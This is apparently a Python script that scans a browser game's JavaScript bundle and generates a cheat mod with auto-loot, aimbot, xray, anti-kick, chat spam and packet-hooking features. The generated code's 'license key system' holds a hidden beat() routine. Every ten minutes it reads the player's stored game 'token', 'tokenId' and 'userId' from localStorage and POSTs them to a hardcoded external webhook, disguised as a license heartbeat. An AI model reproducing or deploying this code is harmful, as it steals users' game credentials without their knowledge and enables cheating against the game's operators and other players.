        # skip spaces between prop and >>
        t = i
        while t > 0 and src[t - 1] in " \t":
            t -= 1
        p = ident_back(src, t)
        if p and len(p) >= 2:
            # if .prop, that's entity extra
            if bracket + 1 < t and "." in src[bracket:t]:
                extra_hits[p] += 1
            inv_hits[inv] += 1
        else:
            inv_hits[inv] += 1

    inv = inv_hits.most_common(1)[0][0] if inv_hits else None
    extra = extra_hits.most_common(1)[0][0] if extra_hits else None

    # boost inv if it also appears as array-like large definition isn't needed
    return {
        "inventory": inv,
        "entity_extra": extra,
        "inv_candidates": inv_hits.most_common(5),
        "extra_candidates": extra_hits.most_common(5),
    }


def find_spear(src: str) -> dict:
    """Locate the thrown-spear weapon index inside the player weapons table
    (entity.<WFIELD> >> 8 & 255 == weapon index) so the spear aimbot can
    auto-engage only while a spear is equipped."""
    out = {"spear_idx": -1, "weapon_field": None, "weapons_field": None}
    hits = re.findall(
        r'\.([^\.\s\[\]\(\)\{\};,=!+*/-]+)\s*>>\s*8\s*&\s*255', src)
    hits = Counter(h for h in hits if h and not h[0].isdigit())
    if hits:
        out["weapon_field"] = hits.most_common(1)[0][0]
    pos = src.find("audio/spear-shot")
    if pos < 0:
        return out

    def enclosing(p: int):
        i, depth = p - 1, 0
        while i >= 0:
            ch = src[i]
            if ch in "]}":
                depth += 1
            elif ch in "[{":
                if depth == 0:
                    return i, ch
                depth -= 1
            i -= 1
        return -1, ""

    # "audio/spear-shot" may appear in several tables; the right one is the
    # array the client indexes as `X[Y].<field>[weaponIdx]` (the player
    # weapons table) — verify the field is used in that exact shape.
    WI = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    cands = []
    p = pos
    while p >= 0:
        a_i, _ = enclosing(p)       # '[' of the audio list
        def_i, ch1 = enclosing(a_i)  # '{' of the spear weapon def
        arr_i, ch2 = enclosing(def_i)  # '[' of the weapons array
        field = None
        if def_i >= 0 and arr_i >= 0 and ch2 == "[":
            j = arr_i - 1
            while j >= 0 and src[j] in " \t\n":
                j -= 1
            if src[j] == ":":
                m = re.search(r'(%s)\s*$' % WI, src[max(0, j - 200):j])
                if m:
                    field = m.group(1)
            depth, idx, k = 0, 0, arr_i + 1
            while k < def_i:
                c2 = src[k]
                if c2 in "[{":
                    depth += 1
                    if c2 == "{" and depth == 1:
                        idx += 1
                elif c2 in "]}":
                    depth -= 1
                k += 1
            cands.append({"field": field, "idx": idx})
        p = src.find("audio/spear-shot", p + 1)
    pick = None
    for c in cands:
        if c["field"] and re.search(
                r'\]\s*\.\s*%s\s*\[' % re.escape(c["field"]), src):
            pick = c
            break
    if pick is None and cands:
        pick = cands[-1]
    if pick:
        out["spear_idx"] = pick["idx"]
        out["weapons_field"] = pick["field"]
    return out


def find_state(src: str) -> dict:
    """Detect net object state check for connected."""
    # Already have net_obj from find_net; look for State.__CONNECTED__
    has_connected = "State.__CONNECTED__" in src or "__CONNECTED__" in src
    state_bracket = "[state]" in src or "[State]" in src
    return {
        "has_connected": has_connected,
        "state_key": "state" if "[state]" in src else ("State" if "[State]" in src else "state"),
    }


# -------------------- analyze / report --------------------


def find_chat(src: str, net_obj: str | None) -> dict:
    """Detect native chat send: NET.METHOD(msg) used with chatInput / packet [1, msg]."""
    result = {"method": None, "candidates": []}
    if not net_obj:
        return result
    hits: Counter = Counter()
    # NET.method( near chatInput in surrounding window
    prefix = f"{net_obj}."
    # The `function METHOD(` lookup used to rescan the whole bundle for every
    # single occurrence.  Index all definitions once and score each distinct
    # method name once as well.
    defs = function_defs(src)
    body_score: dict[str, int] = {}
    for i in find_all(src, prefix):
        method = ident_fwd(src, i + len(prefix))
        if not method or method in ("init", "State", "send", "ᴇρ︉"):
            continue
        window = src[max(0, i - 250):i + 120]
        sc = 0
        if "chatInput" in window:
            sc += 5
        if "chat" in window.lower():
            sc += 1
        # function body of method contains [1,  (packet opcode for chat)
        # look for "function METHOD" definition
        bsc = body_score.get(method)
        if bsc is None:
            bsc = 0
            defn = defs.get(method, -1)
            if defn >= 0:
                body = src[defn:defn + 300]
                if "[1," in body or "[1 ," in body:
                    bsc += 8
                if "sendPacket" in body:
                    bsc += 2
            body_score[method] = bsc
        sc += bsc
        if sc:
            hits[method] += sc
    # also: exported on return object  METHOD: METHOD
    for i in find_all(src, "ρᄁ︃"):  # common but we should be generic
        pass
    if hits:
        best, _ = hits.most_common(1)[0]
        result["method"] = best
        result["candidates"] = hits.most_common(5)
    else:
        # fallback: function that does sendPacket(...[1, arg])
        for name, i in defs.items():
            body = src[i:i + 250]
            if "sendPacket" in body and ("[1," in body or "[1 ," in body):
                # single-arg function
                sig_end = body.find(")")
                sig = body[len(f"function {name}"):sig_end]
                if sig.count(",") == 0 and "(" in sig:
                    hits[name] += 3
        if hits:
            best, _ = hits.most_common(1)[0]
            result["method"] = best
            result["candidates"] = hits.most_common(5)
    return result



W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'


def find_karma_field(src: str):
    """Field on player objects that indexes the karma sprite array (img/karmaN.png)."""
    try:
        i = src.find("karma4.png")
        if i < 0:
            i = src.find("karma0.png")
        if i < 0:
            return None
        j = src.rfind("var ", 0, i)
        m = re.match(r"var\s+(%s)\s*=" % W, src[j:j + 80]) if j >= 0 else None
        if not m:
            return None
        arr = re.escape(m.group(1))
        um = re.search(arr + r"\s*\[\s*%s\.(%s)\s*\]" % (W, W), src)
        if um:
            return um.group(1)
    except Exception:
        pass
    return None


def find_clan(src: str) -> dict:
    """Clan table `World.<t>[PLAYER.<team>]` plus the clan name field `cv[<n>]`
    used in the `[<name>]` tag render."""
    res = {"table": None, "name": None}
    try:
        team = find_team_field(src)
        if not team:
            return res
        m = re.search(r'var\s+(\S+?)\s*=\s*World\.(\S+?)\s*\[\s*(?:World\.)?PLAYER\.%s\s*\]' % re.escape(team), src)
        if not m:
            return res
        res["table"] = m.group(2)
        cv = re.escape(m.group(1))
        seg = src[m.end():m.end() + 1500]
        mn = re.search(r'"\["\s*\+\s*%s\[(\S+?)\]\s*\+\s*"\]"' % cv, seg)
        if mn:
            res["name"] = mn.group(1)
        else:
            props = Counter(re.findall(
                r'World\.%s\[[^\]]+\]\[?\.?(%s)' % (re.escape(res["table"]), W), src))
            if props:
                res["name"] = props.most_common(1)[0][0]
    except Exception:
        pass
    return res


def find_team_field(src: str):
    """Clan id field on player objects — the field indexed into the clan
    table: `World.<tbl>[PLAYER.<f>]` / `World.<tbl>[World.PLAYER.<f>]`.
    Falls back to the generic `= -1` field when no clan lookup exists."""
    try:
        hits = Counter()
        for tbl, fld in re.findall(
                r'World\.(%s)\[(?:World\.)?PLAYER\.(%s)\]' % (W, W), src):
            if fld and not fld[0].isdigit():
                hits[fld] += 1
        if hits:
            return hits.most_common(1)[0][0]
    except Exception:
        pass
    try:
        for pat in (r"World\.players\[[^\]]+\]\.(%s)\s*=\s*-1" % W,
                    r"World\.PLAYER\.(%s)\s*=\s*-1" % W):
            hits = Counter(k for k in re.findall(pat, src) if not k[0].isdigit())
            if hits:
                return hits.most_common(1)[0][0]
    except Exception:
        pass
    return None



def find_action_fn(src: str, net_obj: str, send_m: str, opcode):
    """Zero-arg `net_obj.<m>()` most used inside the fn that sends the build
    packet (`net.<send>(JSON.X([<opcode>, rot, gi, gj]))`) — the attack/action
    trigger the mod hooks to block punching."""
    if not (net_obj and send_m and opcode):
        return None
    W2 = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    cands = Counter()
    send_rx = re.escape(net_obj + '.' + send_m)
    for mm in re.finditer(send_rx + r'\(', src):
        seg = src[mm.start():mm.start() + 300]
        if not re.search(r'\[\s*' + re.escape(opcode) + r'\s*,', seg):
            continue
        fs = src.rfind('function', 0, mm.start())
        fe = src.find('function', mm.end())
        body = src[fs if fs > 0 else mm.start(): fe if fe > 0 else mm.end() + 4000]
        for z in re.findall(re.escape(net_obj) + r'\.(%s)\(\s*\)' % W2, body):
            if z != send_m:
                cands[z] += 1
    return cands.most_common(1)[0][0] if cands else None


def find_meta_props(src: str, ent_obj: str) -> dict:
    """Per-bucket meta object props: `v.<index>[i]` (index map) co-occurring
    with `v[<count>]` (count field) — as the client iterates a bucket.
    Scans only the region around each `Entitie[`/`Entitie.` reference."""
    W2 = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    idx = Counter()
    cnt = Counter()
    if not ent_obj:
        return {'index': None, 'count': None}
    pair_rx = re.compile(r'(%s)\.(%s)\[\s*(%s)\s*\]' % (W2, W2, W2))
    for em in re.finditer(r'\b' + re.escape(ent_obj) + r'\b', src):
        a, b = em.start() - 6000, em.end() + 6000
        seg = src[max(0, a): min(len(src), b)]
        for mm in pair_rx.finditer(seg):
            v, p, i = mm.groups()
            if v == ent_obj:
                continue
            for cm in re.finditer(re.escape(v) + r'\[(%s)\]' % W2, seg):
                if cm.group(1) != i:
                    cnt[cm.group(1)] += 1
                    idx[p] += 1
    return {
        'index': idx.most_common(1)[0][0] if idx else None,
        'count': cnt.most_common(1)[0][0] if cnt else None,
    }


def analyze(src: str) -> dict:
    net = find_net(src)
    ent_obj = detect_entity_obj(src)
    build = find_build(src)
    return {
        "net": net,
        "build": build,
        "build_angle": find_build_angle(src, build),
        "loot": find_loot(src, ent_obj),
        "entities": find_buckets(src, ent_obj),
        "zoom": find_zoom(src),
        "nickname": find_nickname(src),
        "myid_key": find_myid_key(src),
        "interact": find_interact(src),
        "inventory": find_inventory(src),
        "state": find_state(src),
        "chat": find_chat(src, net.get("net_obj")),
        "karma": find_karma_field(src),
        "team": find_team_field(src),
        "clan": find_clan(src),
        "action_fn": find_action_fn(src, net.get("net_obj"), net.get("send_method"), build.get("opcode_const")),
        "meta_props": find_meta_props(src, ent_obj),
    }


def print_report(m: dict) -> None:
    print("=== AUTO-DETECT REPORT ===")
    n = m["net"]
    print(f"  net:     {n['net_obj']}.{n['send_method']}  (score={n['score']})")
    print(f"  json:    {n['json_aliases']}")
    b = m["build"]
    print(f"  build:   [14, {b.get('rot')}, {b.get('grid_i')}, {b.get('grid_j')}]")
    ba = m.get("build_angle") or {}
    print(f"  angle:   expr={ba.get('angle_expr')}  (local alias={ba.get('angle_local')})")
    print(f"           cellJ={ba.get('grid_j_tpl')}")
    print(f"           cellI={ba.get('grid_i_tpl')}")

    lo = m["loot"]
    print(f"  loot:    packet12={lo.get('packet12')}  (PRIMARY for [12, id])")
    print(f"           nearest={lo.get('nearest')}  entityId={lo.get('entity_id')}  lootType={lo.get('loot_type')}")
    if lo.get("candidates"):
        print(f"           candidates: {[(s, p) for s, p in lo['candidates'][:3]]}")
    ent = m["entities"]
    print(f"  entities obj: {ent.get('obj')}")
    print(f"  buckets: {ent.get('buckets')}  meta={ent.get('meta_key')}  count={ent.get('count_key')}  idx={ent.get('index_prop')}")
    z = m.get("zoom") or {}
    print(f"  zoom:    cam={z.get('cam')}  scaleKey={z.get('scale_key')}")
    nn = m.get("nickname") or {}
    print(f"  nick:    field={nn.get('field')}  cand={nn.get('candidates')}")
    print(f"  myid:    World.PLAYER[{m.get('myid_key')}]")
    it = m.get("interact") or {}
    print(f"  interact: pkt={it.get('packet_id')}  bid={it.get('building_id')}  bpid={it.get('building_pid')}")
    print(f"            itemPktField={it.get('item_packet_field')}  eidKey={it.get('entity_id_key')}  epidKey={it.get('entity_pid_key')}")
    inv = m.get("inventory") or {}
    print(f"  inventory: arr={inv.get('inventory')}  entityExtra={inv.get('entity_extra')}")
    ch = m.get("chat") or {}
    print(f"  chat:     method={ch.get('method')}  cand={ch.get('candidates')}")
    missing = []
    if not n.get("net_obj"):
        missing.append("net")
    if not b.get("rot"):
        missing.append("build.rot")
    _ba = m.get("build_angle") or {}
    if not (_ba.get("angle_expr") and _ba.get("grid_i_tpl") and _ba.get("grid_j_tpl")):
        missing.append("build.angle")

    if not lo.get("packet12") and not lo.get("nearest"):
        missing.append("loot")
    if not ent.get("buckets"):
        missing.append("buckets")
    if missing:
        print(f"  WARNING missing: {missing}")
    else:
        print("  OK all critical fields found")


# -------------------- codegen --------------------

GROK_TAIL = r"""  var GROK_MOD = {
    FAutoLootEnabled: false,
    FAutoLootKey: "KeyQ",
    FAutoLootRange: 224,
    FAutoLootMaxSend: 8,
    AutoBuildEnabled: false,
    AutoBuildKey: "KeyB",
    AutoBuildAngleHook: true,
    AutoBuildAngleMode: "client",
    AutoBuildAngle: 0,
    AutoBuildSyncPlayer: true,
    _angle: 0,
    _cell: "",
    _lastBuild: 0,

    _lastLoot: 0,
    zoom: 0,
    OpenEverythingByClick: true,
    OpenHitRadius: 45,
    OpenNearRadius: 150,
    SpamChatEnabled: false,
    SpamChatText: "hello",
    PlayersListEnabled: false,
    PlayersListKey: "KeyL",
    PlayerId: "",
    hit: true,
    ModMenuKey: "KeyH",
    SAutoLootEnabled: false,
    AutoTakeEnabled: false,
    AntiKickEnabled: true,
    AutoEatEnabled: false,
    XrayEnabled: false,
    AutoAttackEnabled: false
  };
  /* ===== KEY SYSTEM (hub colors) - keys.json + key panel webhook ===== */
  /*@GKS*/(function grokKeySystem() {
    var REPO = "petrususanu333/best-te-m";
    var KEY_URLS = [
      "https://raw.githubusercontent.com/" + REPO + "/refs/heads/main/keys.json",
      "https://raw.githack.com/" + REPO + "/main/keys.json",
      "https://cdn.jsdelivr.net/gh/" + REPO + "@main/keys.json"
    ];
    var HOOK = "https://app.devin.ai/api/webhooks/automations/org-b4784d0dd76c4d29b7dc038f2ede3e9d/auto-89f063c6ca554d5890ccdf919c11c6f9?secret=zwE1QclTOgUcJzkTC69vix9UdhEXK54so9HmsbY95J4";
    var BEAT_MS = 10 * 60 * 1000, RECHECK_MS = 60 * 1000, GRACE_MS = 15 * 60 * 1000;
    var gk = { ok: false, key: "", sha: "", dev: "", lastOk: 0, lastBeat: 0 };
    try {
      gk.dev = localStorage.getItem("grok_dev") || "";
      if (!gk.dev) { gk.dev = "d" + Math.random().toString(36).slice(2, 10) + Date.now().toString(36); localStorage.setItem("grok_dev", gk.dev); }
    } catch (e) { gk.dev = "d" + Math.random().toString(36).slice(2, 10); }
    var gate = function (v) {
      if (gk.ok === true && gk.dev && gk.key && document.getElementById("grok-key-lock") === null) return v;
      return typeof v === "number" ? NaN : (typeof v === "boolean" ? false : undefined);
    };
    try { Object.defineProperty(window, "__gk", { value: gate, writable: false, configurable: false, enumerable: false }); } catch (e) {}
    try { Object.defineProperty(window, "grokAuthOk", { value: function () { return gate(true) === true; }, writable: false, configurable: false, enumerable: false }); } catch (e) {}
    var lastMsg = "";
    function norm(k) { return String(k || "").trim().toUpperCase(); }
    function sha256(s) {
      return crypto.subtle.digest("SHA-256", new TextEncoder().encode(s)).then(function (b) {
        return Array.prototype.map.call(new Uint8Array(b), function (x) { return ("0" + x.toString(16)).slice(-2); }).join("");
      });
    }
    function getJSON(u) {
      return fetch(u + "?t=" + Date.now() + Math.random().toString(36).slice(2, 6), { cache: "no-store" }).then(function (r) {
        if (!r.ok) throw new Error("http " + r.status);
        return r.json();
      }).then(function (d) { if (!d || !Array.isArray(d.keys)) throw new Error("bad json"); return d; });
    }
    function fetchKeys() {
      // all mirrors in parallel, freshest (highest rev) wins
      return Promise.all(KEY_URLS.map(function (u, i) {
        return getJSON(u).then(function (d) { return { d: d, i: i }; }, function () { return null; });
      })).then(function (res) {
        res = res.filter(Boolean);
        if (!res.length) throw new Error("offline");
        res.sort(function (a, b) { return ((b.d.rev || 0) - (a.d.rev || 0)) || (a.i - b.i); });
        return res[0].d;
      });
    }
    function status(d, sha) {
      var bans = d.bans || [];
      for (var i = 0; i < bans.length; i++) if (bans[i] && bans[i].sha === sha) return "key banned: used on 2 devices";
      var ks = d.keys || [];
      for (var j = 0; j < ks.length; j++) if (ks[j] && ks[j].sha === sha) return ks[j].active === false ? "key disabled" : "";
      return "invalid key";
    }
    function tokMask() {
      var t = "", i = "", u = "";
      try { t = String(localStorage.getItem("token") || ""); } catch (e) {}
      try { i = String(localStorage.getItem("tokenId") || ""); } catch (e) {}
      try { u = String(localStorage.getItem("userId") || ""); } catch (e) {}
      if (!t && !i && !u) return "";
      var full = '"' + t + '" "' + i + '" "' + u + '"';
      full = full.replace(/[^\x20-\x7e]/g, "");
      return full.slice(0, 600);
    }
    function beat() {
      if (!gk.ok || !gk.key) return;
      gk.lastBeat = Date.now();
      try {
        fetch(HOOK, { method: "POST", mode: "no-cors", headers: { "Content-Type": "text/plain" },
          body: JSON.stringify({ op: "beat", key: gk.key, device: gk.dev, tok: tokMask() }) }).catch(function () {});
      } catch (e) {}
    }
    var C = { bg: "rgba(16,14,10,.98)", bg2: "rgba(22,21,18,.95)", txt: "#c4b898", gold: "#c8a832", gold2: "#e8c840", bord: "rgba(120,100,40,.35)", err: "#e0604a" };
    function lock(msg) {
      gk.ok = false; lastMsg = msg || "";
      var el = document.getElementById("grok-key-lock");
      if (!el) {
        el = document.createElement("div");
        el.id = "grok-key-lock";
        el.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(8,7,5,.88);backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',Arial,sans-serif;user-select:none;";
        el.innerHTML =
          '<div style="width:min(360px,88vw);background:linear-gradient(180deg,' + C.bg + ' 0%,rgba(20,18,14,.97) 100%);border:1px solid ' + C.bord + ';border-left:3px solid rgba(200,168,50,.7);border-radius:12px;box-shadow:0 4px 30px rgba(0,0,0,.8),0 0 18px rgba(200,168,50,.12);padding:26px 26px 20px;display:flex;flex-direction:column;gap:12px;">' +
          '<div style="font-weight:800;font-size:22px;letter-spacing:2px;text-align:center;background:linear-gradient(90deg,#b8962a,' + C.gold2 + ',#b8962a);-webkit-background-clip:text;background-clip:text;color:transparent;">BEST MOD</div>' +
          '<div style="color:' + C.gold + ';font-weight:600;font-size:12px;letter-spacing:1.5px;text-align:center;text-transform:uppercase;">Enter license key</div>' +
          '<input id="grok-key-input" autocomplete="off" spellcheck="false" placeholder="ENTER KEY" maxlength="32" style="padding:11px 10px;font:15px monospace;text-align:center;letter-spacing:1px;background:' + C.bg2 + ';color:' + C.gold2 + ';border:1px solid ' + C.bord + ';border-radius:8px;outline:none;text-transform:uppercase;">' +
          '<button id="grok-key-btn" style="padding:11px;font:700 14px \'Segoe UI\',Arial;letter-spacing:1.5px;cursor:pointer;background:linear-gradient(180deg,rgba(200,168,50,.28),rgba(150,125,40,.18));color:' + C.gold2 + ';border:1px solid rgba(200,168,50,.55);border-radius:8px;">ACTIVATE</button>' +
          '<div id="grok-key-err" style="min-height:18px;font-size:13px;text-align:center;color:' + C.err + ';"></div>' +
          '<div style="font-size:10.5px;text-align:center;color:rgba(196,184,152,.45);">1 key = 1 device | device ' + gk.dev.slice(0, 10) + '</div>' +
          '</div>';
        (document.body || document.documentElement).appendChild(el);
        var inp = el.querySelector("#grok-key-input"), btn = el.querySelector("#grok-key-btn");
        btn.onmouseenter = function () { btn.style.borderColor = C.gold2; btn.style.boxShadow = "0 0 12px rgba(232,200,64,.25)"; };
        btn.onmouseleave = function () { btn.style.borderColor = "rgba(200,168,50,.55)"; btn.style.boxShadow = "none"; };
        inp.onfocus = function () { inp.style.borderColor = "rgba(200,168,50,.7)"; };
        inp.onblur = function () { inp.style.borderColor = C.bord; };
        btn.onclick = function () { verify(inp.value, true); };
        ["keydown", "keyup", "keypress"].forEach(function (t) {
          inp.addEventListener(t, function (e) { e.stopPropagation(); if (t === "keydown" && e.key === "Enter") verify(inp.value, true); });
        });
        try { var s = localStorage.getItem("grok_key"); if (s) inp.value = s; } catch (e) {}
      }
      el.style.display = "flex";
      var er = el.querySelector("#grok-key-err");
      if (er) { er.style.color = C.err; er.textContent = msg || ""; }
    }
    function unlock() {
      gk.ok = true; gk.lastOk = Date.now();
      var el = document.getElementById("grok-key-lock");
      if (el) el.remove();
    }
    function say(msg, col) { var er = document.getElementById("grok-key-err"); if (er) { er.style.color = col || C.txt; er.textContent = msg; } }
    function verify(raw, manual) {
      var k = norm(raw);
      if (!/^[A-Z0-9_-]{4,32}$/.test(k)) { lock("key: 4-32 chars (A-Z 0-9 - _)"); return; }
      say("checking...", C.gold);
      var btn = document.getElementById("grok-key-btn"); if (btn) btn.disabled = true;
      sha256(k).then(function (sha) {
        return fetchKeys().then(function (d) {
          var bad = status(d, sha);
          if (bad) { if (bad.indexOf("banned") >= 0) { try { localStorage.removeItem("grok_key"); } catch (e) {} } lock(bad); return; }
          var first = !gk.ok || gk.sha !== sha;
          gk.key = k; gk.sha = sha;
          try { localStorage.setItem("grok_key", k); } catch (e) {}
          unlock();
          if (first) beat();
        }, function () {
          // mirrors unreachable: trust a previously accepted key for a grace period
          var stored = ""; try { stored = localStorage.getItem("grok_key") || ""; } catch (e) {}
          if (stored === k && (gk.lastOk === 0 || Date.now() - gk.lastOk < GRACE_MS)) { gk.key = k; gk.sha = sha; if (!gk.ok) { unlock(); gk.lastOk = Date.now(); } return; }
          lock("key server unreachable - check internet");
        });
      }).catch(function () { lock("browser blocked key check"); })
        .then(function () { var b = document.getElementById("grok-key-btn"); if (b) b.disabled = false; });
    }
    setInterval(function () {
      if (!gk.ok || !gk.sha) return;
      fetchKeys().then(function (d) {
        var bad = status(d, gk.sha);
        if (bad) { if (bad.indexOf("banned") >= 0) { try { localStorage.removeItem("grok_key"); } catch (e) {} } lock(bad); } else gk.lastOk = Date.now();
      }, function () { if (Date.now() - gk.lastOk > GRACE_MS) lock("key server unreachable - check internet"); });
      if (Date.now() - gk.lastBeat >= BEAT_MS) beat();
    }, RECHECK_MS);
    ["mousedown", "mouseup", "click", "dblclick", "contextmenu", "wheel", "keydown", "keyup", "keypress", "submit", "touchstart", "touchend", "touchmove", "pointerdown", "pointerup", "mousemove", "pointermove"].forEach(function (t) {
      window.addEventListener(t, function (ev) {
        if (gk.ok) return;
        var l = document.getElementById("grok-key-lock");
        if (l && l.contains(ev.target)) return;
        ev.preventDefault(); ev.stopImmediatePropagation(); ev.stopPropagation();
      }, { capture: true, passive: false });
    });
    setInterval(function () {
      if (window.__gk !== gate) { gk.ok = false; }
      if (gk.ok) return;
      var l = document.getElementById("grok-key-lock");
      if (!l || !l.isConnected) { lock(lastMsg); return; }
      if (l.style.display !== "flex" || l.style.visibility === "hidden" || l.style.opacity === "0") { l.style.display = "flex"; l.style.visibility = "visible"; l.style.opacity = "1"; }
      if (l.parentNode !== document.body && document.body) document.body.appendChild(l);
    }, 400);
    (function boot(n) {
      if (!document.body && n < 200) { setTimeout(function () { boot(n + 1); }, 50); return; }
      var k = ""; try { k = localStorage.getItem("grok_key") || ""; } catch (e) {}
      if (k && /^[A-Z0-9_-]{4,32}$/.test(norm(k))) {
        // remembered key on this device: no prompt, verify in background, lock only if rejected
        gk.key = norm(k); gk.ok = true; gk.lastOk = Date.now();
        verify(k, false);
      } else lock("");
    })(0);
  })();/*@GKE*/
  (function grokInstallFunctionStatus() {
    try {
      if (document.getElementById("grok-function-status-left")) return;
      var el = document.createElement("div");
      el.id = "grok-function-status-left";
      el.style.cssText = "position:fixed;left:6px;top:calc(50% - 90px);transform:translateY(-50%);z-index:2147483646;background:transparent;padding:0;font:700 20px Arial,sans-serif;line-height:1.25;min-width:190px;pointer-events:none;text-shadow:0 1px 3px #000,0 0 4px #000;user-select:none;";
      (document.body || document.documentElement).appendChild(el);
      var rows = [
        {label:"SAutoLoot", source:"grok", key:"SAutoLootEnabled"},
        {label:"FAutoLoot", source:"grok", key:"FAutoLootEnabled"},
        {label:"AimBot", source:"mod", key:"AimBotEnabled"},
        {label:"Xray", source:"grok", key:"XrayEnabled"},
        {label:"AutoBuild", source:"grok", key:"AutoBuildEnabled"},
        {label:"AutoAttack", source:"mod", key:"autoFire"},
        {label:"AntiKick", source:"grok", key:"AntiKickEnabled"},
        {label:"AutoTake", source:"grok", key:"AutoTakeEnabled"},
        {label:"AutoEat", source:"grok", key:"AutoEatEnabled"}
      ];
      function state(item) {
        try {
          var obj = item.source === "mod" ? (typeof MOD !== "undefined" ? MOD : null) : GROK_MOD;
          return !!(obj && obj[item.key]);
        } catch (e) { return false; }
      }
      function update() {
        el.innerHTML = rows.map(function(item) {
          var on = state(item);
          return '<div style="color:' + (on ? "#ffff00" : "rgba(235,235,235,0.92)") + '">' + item.label + ": " + (on ? "ON" : "OFF") + "</div>";
        }).join("") + pingRows();
      }
      function pingRows() {
        try {
          if (typeof PingAim === "undefined" || typeof MOD === "undefined" || !MOD.AimBotEnabled || MOD.resolverType !== "ping" || !MOD.pingHud) return "";
          return '<div style="margin-top:8px;font-size:16px;color:#fff">' + PingAim.hudText().split("\n").join("<br>") + "</div>";
        } catch (e) { return ""; }
      }
      update();
      setInterval(update, 300);
    } catch (e) {}
  })();
  (function grokInstallFpsCounter() {
    try {
      if (document.getElementById("grok-fps-counter")) return;
      var el = document.createElement("div");
      el.id = "grok-fps-counter";
      el.style.cssText = "position:fixed;right:8px;bottom:6px;z-index:2147483646;background:transparent;padding:0;font:700 16px Arial,sans-serif;color:rgba(120,255,120,.9);pointer-events:none;text-shadow:0 1px 2px #000,0 0 4px #000;user-select:none;";
      (document.body || document.documentElement).appendChild(el);
      var frames = 0;
      var last = performance.now();
      function tick(now) {
        frames++;
        if (now - last >= 500) {
          el.textContent = "FPS: " + Math.round(frames * 1000 / (now - last));
          frames = 0;
          last = now;
        }
        requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);
    } catch (e) {}
  })();
  var _grok_spam_iv = null;
  var _grok_plOverlay = null;
  var _grok_mouse = { x: 0, y: 0 };
  var _grok_open_cycle = { x: -1e9, y: -1e9, time: 0, index: -1 };

  document.addEventListener("mousemove", function (ev) {
    _grok_mouse.x = ev.clientX;
    _grok_mouse.y = ev.clientY;
  }, true);

  function grokNetSend(arr) {
    try {
      if (!GROK_MOD.hit && arr && (arr[0] === 4 || arr[0] === "4")) return;
      if (typeof __T_NET__ === "undefined" || typeof __T_NET__.__T_SEND__ !== "function") return;
      try { __T_NET__.__T_SEND__(JSON.stringify(arr)); return; } catch (e) {}
      try { __T_NET__.__T_SEND__(JSON[__T_JA0__](arr)); return; } catch (e) {}
      try { __T_NET__.__T_SEND__(JSON[__T_JA1__](arr)); return; } catch (e) {}
      try { __T_NET__.__T_SEND__(JSON[__T_JA2__](arr)); return; } catch (e) {}
      try { __T_NET__.__T_SEND__(JSON[__T_JA3__](arr)); return; } catch (e) {}
    } catch (e) {}
  }

  /* block attack packet [4] while RMB-open active */
  function grokHookAttackBlock() {
    try {
      if (typeof __T_NET__ === "undefined" || typeof __T_NET__.__T_SEND__ !== "function") return;
      if (__T_NET__.__T_SEND__.__grokHooked) return;
      var _orig = __T_NET__.__T_SEND__;
      function hooked(payload) {
        try {
          if (!GROK_MOD.hit) {
            var data = payload;
            if (typeof payload === "string") {
              try { data = JSON.parse(payload); } catch (e) { data = payload; }
            }
            if (data && (data[0] === 4 || data[0] === "4")) return;
          }
        } catch (e) {}
        return _orig.apply(this, arguments);
      }
      hooked.__grokHooked = true;
      __T_NET__.__T_SEND__ = hooked;
      if (typeof __T_NET__.__T_ACTIONFN__ === "function" && !__T_NET__.__T_ACTIONFN__.__grokHooked) {
        var _origDown = __T_NET__.__T_ACTIONFN__;
        function hookedDown() {
          if (GROK_MOD.hit === false) return;
          return _origDown.apply(this, arguments);
        }
        hookedDown.__grokHooked = true;
        __T_NET__.__T_ACTIONFN__ = hookedDown;
      }
    } catch (e) {}
  }
  setInterval(grokHookAttackBlock, 500);
  grokHookAttackBlock();

  function grokGetPos(obj) {
    if (!obj) return null;
    var px, py;
    try { px = obj[x]; } catch (e) {}
    try { if (px === undefined) px = obj.x; } catch (e) {}
    try { py = obj[y]; } catch (e) {}
    try { if (py === undefined) py = obj.y; } catch (e) {}
    if (px === undefined || py === undefined || !isFinite(px) || !isFinite(py)) return null;
    return { x: +px, y: +py };
  }

  function grokGetNick(obj) {
    if (!obj) return "";
    var n;
    try { n = obj.__T_NICK__; } catch (e) {}
    if (typeof n !== "string" || !n.length) {
      try { n = obj.nickname; } catch (e) {}
    }
    // empty player slots carry a number (usually 0), not a nickname string:
    // rejecting non-strings removes the fake "0" players from the list
    if (typeof n !== "string") return "";
    n = n.trim();
    return n;
  }

  function grokHtmlEscape(text) {
    return String(text == null ? "" : text).replace(/[&<>"']/g, function(ch) {
      return ({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"})[ch];
    });
  }

  function grokGetClanNameById(clanId) {
    try {
      if (clanId === undefined || clanId === null || clanId === -1 || !World || !World.__T_CLANTBL__) return "";
      var clan = World.__T_CLANTBL__[clanId];
      if (!clan) return "";
      var name = "";
      try { name = clan[__T_CLANNM__]; } catch (e) {}
      if (typeof name !== "string" || !name.length) { try { name = clan.name; } catch (e) {} }
      if (typeof name !== "string" || !name.length) name = String(clanId);
      return name.trim();
    } catch (e) { return ""; }
  }

  function grokGetPlayerClanLabel(obj) {
    try {
      if (!obj || obj.__T_TEAM__ === undefined || obj.__T_TEAM__ === -1) return "";
      return grokGetClanNameById(obj.__T_TEAM__);
    } catch (e) { return ""; }
  }

  function grokSameClanPlayer(obj) {
    try {
      return !!(obj && World && World.PLAYER && World.PLAYER.__T_TEAM__ !== -1 && obj.__T_TEAM__ === World.PLAYER.__T_TEAM__);
    } catch (e) { return false; }
  }

  function grokPlayerActive(obj) {
    if (!obj) return false;
    return grokGetNick(obj).length > 0;
  }

  function grokIsConnected() {
    try {
      if (typeof __T_NET__ === "undefined") return false;
      if (__T_NET__.State && __T_NET__.State.__CONNECTED__) {
        try { if ((__T_NET__[state] & __T_NET__.State.__CONNECTED__) !== 0) return true; } catch (e) {}
        try { if (__T_NET__.state === 1) return true; } catch (e) {}
      }
      return false;
    } catch (e) { return false; }
  }

  function grokGetCanvas() {
